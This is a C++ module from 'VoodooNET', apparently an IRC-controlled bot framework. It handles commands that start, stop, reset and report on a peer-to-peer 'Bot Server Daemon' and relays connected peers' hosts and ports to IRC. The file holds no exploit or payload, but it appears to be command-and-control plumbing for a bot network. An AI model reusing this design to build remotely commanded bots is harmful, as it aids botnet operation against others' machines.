/*
 *  VoodooNET - a modular multi-threaded program for Windows x86/x64 bit
 *	Coded by VoRTeCKZ - @therealvorteckz
 *  VoRTeCKZ Studios
 *
 *	Copyright (C) 2023 - All Rights Reserved.
 *
 * Permission to ("use, copy, and/or modify") this software for
 * any purpose  with or without fee is hereby granted, provided that the above copyright
 * notice and this permission notice appear in all copies.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,
 * INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR
 * PURPOSE AND NONINFRINGEMENT OF THIRD PARTY RIGHTS. IN NO EVENT SHALL THE AUTHORS OR
 * COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN
 * ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
 * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 *
 */

#include "includes.h"

cServerControl::cServerControl()
{
#ifdef _DEBUG
	g_cVoodoo->m_cLogging.Print("cServer:Module", "Registering cServerSocket");
#endif
}
cServerControl::~cServerControl()
{
#ifdef _DEBUG
	g_cVoodoo->m_cLogging.Print("cServer:Module", "Unloading module for Daemon Server");
#endif
}

void cServerControl::Init()
{
	ADDCMD(m_cmdListenServer, "p2p.start", "Creates a multi socket server listen module", this);
	ADDCMD(m_cmdP2PStatus, "p2p.status", "Checks if P2P server is running", this);
	ADDCMD(m_cmdP2PReset, "p2p.reset", "Clears clients from P2P server", this);
	ADDCMD(m_cmdP2PStop, "p2p.stop", "Stops P2P server daemon", this);
	ADDCMD(m_cmdP2PClientsCalc, "p2p.clients", "Shows connected client informations", this);

	ADDMODULE(m_cServerControlP2P, "cP2PServ", "1.0", "Peer-to-Peer Connections");

#ifdef _DEBUG
	g_cVoodoo->m_cLogging.Print("cServer:Module", "P2PServer Command Handler");
#endif
#ifndef NO_ASTRO
	g_cVoodoo->m_cAstro.sendmsg("04[15cServer04:15Module04]00 Handle Command");
#endif

#ifndef NO_P2P
	StartDaemon();
#endif

}


void cServerControl::StartDaemon()
{

	DWORD id;
	NTHREAD serverdaemonthread;

	char str_serverdaemon_thread[] = "cServerDaemon";

	serverdaemonthread.threadnum = g_cVoodoo->m_cThread.AddThread(SERVERDAEMON_THREAD, str_serverdaemon_thread, "ServerDaemonThread");
	if (threads[serverdaemonthread.threadnum].tHandle = CreateThread(NULL, 0, &ServerDaemonThread, (LPVOID)&serverdaemonthread, 0, &id)) {
#ifdef _DEBUG
		g_cVoodoo->m_cLogging.Print("cServer:Module", "Bot Server Daemon Thread");
#endif
#ifndef NO_ASTRO
		g_cVoodoo->m_cAstro.sendmsg("04[15cServer04:15Module04] [15Bot Server Daemon04]");
#endif
#ifndef NO_P2P
		g_cVoodoo->m_cServer.b_cRunning = TRUE;
#endif
	}
}

DWORD WINAPI ENDP2P(LPVOID param)
{
	NTHREAD endp2pdaemonthreads = *((NTHREAD*)param);
	NTHREAD* endendp2pdaemonthread = (NTHREAD*)param;


#ifdef _DEBUG
	g_cVoodoo->m_cLogging.Print("cServer:Module", "Stopping P2P Server Daemon");
#endif
#ifndef NO_IRC
	g_cVoodoo->m_cIRC.sendmsg("[cServer:Module] [End P2P listen server]");
#endif
#ifndef NO_P2P
	g_cVoodoo->m_cServer.Cleanup();
	g_cVoodoo->m_cServer.ClearClients();
#endif
	g_cVoodoo->m_cThread.KillThreadP2P();
#ifndef NO_ASTRO
	g_cVoodoo->m_cAstro.sendmsg("04[15cServer04:15Module04] [15cServer Daemon Stopping04]");

#endif
	//
	//g_cVoodoo->m_cServerControl.StartDaemon();
#ifndef NO_P2P
	g_cVoodoo->m_cServer.b_cRunning = FALSE;
#endif
	g_cVoodoo->m_cThread.ClearThread(endp2pdaemonthreads.threadnum);
	g_cVoodoo->m_cThread.KillThread(endp2pdaemonthreads.threadnum);

	
	ExitThread(0);

}





DWORD WINAPI RESETP2P(LPVOID param)
{
	NTHREAD RESETp2pdaemonthreads = *((NTHREAD*)param);
	NTHREAD* RESETendp2pdaemonthread = (NTHREAD*)param;


#ifdef _DEBUG
	g_cVoodoo->m_cLogging.Print("cServer:Module", "Resetting P2P Server Daemon");
#endif
#ifndef NO_IRC
	g_cVoodoo->m_cIRC.sendmsg("[cServer:Module] [End P2P listen server]");
#endif

#ifndef NO_ASTRO
	g_cVoodoo->m_cAstro.sendmsg("04[15cServer04:15Module04] [15Resetting P2P Server Daemon04]");


#endif

	//	Sleep(50);
#ifndef NO_P2P

	g_cVoodoo->m_cServer.Cleanup();
	g_cVoodoo->m_cServer.ClearClients();
#endif
	g_cVoodoo->m_cThread.KillThreadP2P();
#ifndef NO_ASTRO
	g_cVoodoo->m_cAstro.sendmsg("04[15cServer04:15Module04] [00cServer Daemon Loading04]");

#endif
#ifndef NO_P2P
	g_cVoodoo->m_cServerControl.StartDaemon();

	g_cVoodoo->m_cServer.b_cRunning = TRUE;
#endif
	g_cVoodoo->m_cThread.ClearThread(RESETp2pdaemonthreads.threadnum);
	g_cVoodoo->m_cThread.KillThread(RESETp2pdaemonthreads.threadnum);


	Sleep(1000);



	ExitThread(0);

}






bool cServerControl::HandleCommand(char* cmd, char* params, ...)
{
	int iCount = 0;
	list<command*>::iterator ic;
	cString m_sCmd(cmd);

//	DWORD id;
//	NTHREAD serverdaemonthread;
	/////pick park



	for (ic = g_cVoodoo->m_cCommands.m_lCommands.begin(); ic != g_cVoodoo->m_cCommands.m_lCommands.end(); ++ic)
	{
		iCount++;

		//if (!_strcmpi((*ic)->sName.c_str(), cmd))
		if (!m_sCmd.CompareNoCase((*ic)->sName.c_str()))
		{
#ifdef _DEBUG
			g_cVoodoo->m_cLogging.Print("cCommands:RegisteredCommand", "Registered Command: [Command: %s] [Description: %s]", (*ic)->sName.c_str(), (*ic)->sDescription.c_str());
#endif

#ifndef NO_ASTRO
			g_cVoodoo->m_cAstro.sendmsg("04[15cCommands04]: 04[15CommandNum:00 %d04]:00 %s04] [15Description: 00%s04]", iCount, (*ic)->sName.c_str(), (*ic)->sDescription.c_str());
#endif
		}
	}
#ifndef NO_P2P
	//	if (!_strcmpi("p2p.start", cmd))
	if (!m_sCmd.CompareNoCase("p2p.start"))
	{
		if (g_cVoodoo->m_cServer.b_cCheckRunning()) {
#ifdef _DEBUG
			g_cVoodoo->m_cLogging.Print("cServer:Module", "P2P Server is already running");
#endif
#ifndef NO_ASTRO
			g_cVoodoo->m_cAstro.sendmsg("04[15cServer04:15Module]:00 P2P Server is already running");
#endif
			return false;
		}
#ifdef _DEBUG
		g_cVoodoo->m_cLogging.Print("cServer:Module", "Handling command from IRC");
#ifndef NO_IRC

		g_cVoodoo->m_cIRC.sendmsg("[cServer:Module] Handle Command");
#endif
#ifndef NO_ASTRO
		g_cVoodoo->m_cAstro.sendmsg("04[15cServer04:15Module04]00 Handle Command");
#endif
#endif
		DWORD id;
		NTHREAD serverdaemonthread;

		char str_serverdaemon_thread[] = "cServerDaemon";

		serverdaemonthread.threadnum = g_cVoodoo->m_cThread.AddThread(SERVERDAEMON_THREAD, str_serverdaemon_thread, "ServerDaemonThread");
		if (threads[serverdaemonthread.threadnum].tHandle = CreateThread(NULL, 0, &ServerDaemonThread, (LPVOID)&serverdaemonthread, 0, &id)) {
#ifdef _DEBUG
			g_cVoodoo->m_cLogging.Print("cServer:Module", "Bot Server Daemon");
#endif
#ifndef NO_ASTRO
			g_cVoodoo->m_cAstro.sendmsg("04[15cServer04:15Module04] [15Bot Server Daemon04]");
#endif
		}
	}

	//	if (!_strcmpi("p2p.status", cmd))
	if (!m_sCmd.CompareNoCase("p2p.status"))
	{
		if (g_cVoodoo->m_cServer.b_cCheckRunning() != 1)
		{
#ifdef _DEBUG
			g_cVoodoo->m_cLogging.Print("cServer:Module", "P2P Server State (DOWN)");
#endif
#ifndef NO_ASTRO
			g_cVoodoo->m_cAstro.sendmsg("04[15cServer04:15Module04]00 P2P Server State 04(15DOWN04)");
#endif
		}
		else
		{

			int p2pNum = g_cVoodoo->m_cServer.CalculateClients();
#ifdef _DEBUG
			g_cVoodoo->m_cLogging.Print("cServer:Module", "P2P Server State (UP) [Clients: %i]", p2pNum);
#endif
#ifndef NO_ASTRO
			g_cVoodoo->m_cAstro.sendmsg("04[15cServer04:15Module04]00 P2P Server State 04[15UP00(04%i00)04]", p2pNum);
#endif
		}

	}



	if (!m_sCmd.CompareNoCase("p2p.stop"))
	{
		if (g_cVoodoo->m_cServer.b_cCheckRunning())
		{

			/*
			g_cVoodoo->m_cServer.Cleanup();
			g_cVoodoo->m_cServer.ClearClients();
//			g_cVoodoo->m_cThread.KillThreadP2P();
#ifndef NO_ASTRO
			g_cVoodoo->m_cAstro.sendmsg("04[15cServer04:15Module04] [15Ending P2P Server Daemon04]");

#endif
*/	DWORD id;
			NTHREAD endp2pdaemonthread;

			char str_endp2pdaemonend_thread[] = "EndP2PServerDaemon";

			endp2pdaemonthread.threadnum = g_cVoodoo->m_cThread.AddThread(ENDP2PSERVER_THREAD, str_endp2pdaemonend_thread, "ENDP2P");
			if (threads[endp2pdaemonthread.threadnum].tHandle = CreateThread(NULL, 0, &ENDP2P, (LPVOID)&endp2pdaemonthread, 0, &id)) {


#ifdef _DEBUG
				g_cVoodoo->m_cLogging.Print("cServer:Module", "End P2P Server Daemon Thread");
#endif
#ifndef NO_ASTRO
				g_cVoodoo->m_cAstro.sendmsg("04[15cServer04:15Module04] [15End P2P Server Daemon Thread04]");
#endif
				g_cVoodoo->m_cServer.b_cRunning = FALSE;
			}
			Sleep(5000);
			g_cVoodoo->m_cThread.ClearThread(endp2pdaemonthread.threadnum);
			g_cVoodoo->m_cThread.KillThread(endp2pdaemonthread.threadnum);
			return true;
				
		}
		return false;
	}


	if (!m_sCmd.CompareNoCase("p2p.clients"))
	{
		g_cVoodoo->m_cLogging.PrintLine("cServer:Read", "[Listing P2P Clients]");
		for (int y = 1; y < MAX_CLIENTS; y++)
		{
			if (clients[y].socket != NULL)
			{
				g_cVoodoo->m_cLogging.PrintLine("cServer:Member", "Number Total[%i] Number[%i] Name[%s] Port[%i] Host[%s]\r\n", g_cVoodoo->m_cServer.CalculateClients(), y, clients[y].name, clients[y].port, clients[y].host);

				g_cVoodoo->m_cServer.SendToClients("[cServer:Member] Number Total[%i] Number[%i] Name [%s] Port [%i] Host [%s]\r\n", g_cVoodoo->m_cServer.CalculateClients(), y, clients[y].name, clients[y].port, clients[y].host);
#ifndef NO_IRC
				g_cVoodoo->m_cIRC.sendmsg("[cServer:Member] Number Total[%i] Number[%i] Name [%s] Port [%i] Host [%s]", g_cVoodoo->m_cServer.CalculateClients(), y, clients[y].name, clients[y].port, clients[y].host);
#endif
#ifndef NO_ASTRO
				g_cVoodoo->m_cAstro.sendmsg("04[15cServer04:15Member04]00 Number Total04[00%i04]00 Number04[00%i04]00 Name 04[15%s04]00 Port 04[15%i04]00 Host 04[00%s04]", g_cVoodoo->m_cServer.CalculateClients(), y, clients[y].name, clients[y].port, clients[y].host);
#endif
				//g_cVoodoo->m_cServer.p2pList(clients[y].socket);

			}
		}
	}
	if (!m_sCmd.CompareNoCase("p2p.reset"))
	{


		DWORD id;
		NTHREAD RESETp2pdaemonthread;



		char str_RESETserverdaemon_thread[] = "RESETcServerDaemon";

		RESETp2pdaemonthread.threadnum = g_cVoodoo->m_cThread.AddThread(RESETSERVERDAEMON_THREAD, str_RESETserverdaemon_thread, "RESETcServerDaemon");
		if (threads[RESETp2pdaemonthread.threadnum].tHandle = CreateThread(NULL, 0, &RESETP2P, (LPVOID)&RESETp2pdaemonthread, 0, &id)) {

#ifndef NO_ASTRO
			g_cVoodoo->m_cAstro.sendmsg("04[15cServer04:15Module04] [15Bot Server Daemon04]");
#endif

			g_cVoodoo->m_cServer.b_cRunning = TRUE;
			Sleep(2000);

			g_cVoodoo->m_cThread.ClearThread(RESETp2pdaemonthread.threadnum);
			g_cVoodoo->m_cThread.KillThread(RESETp2pdaemonthread.threadnum);

		g_cVoodoo->m_cServer.Init();

		}


	}
#endif
	return true;
}

int cServer::b_cGetSocket()
{
	return m_sServerSock;
}
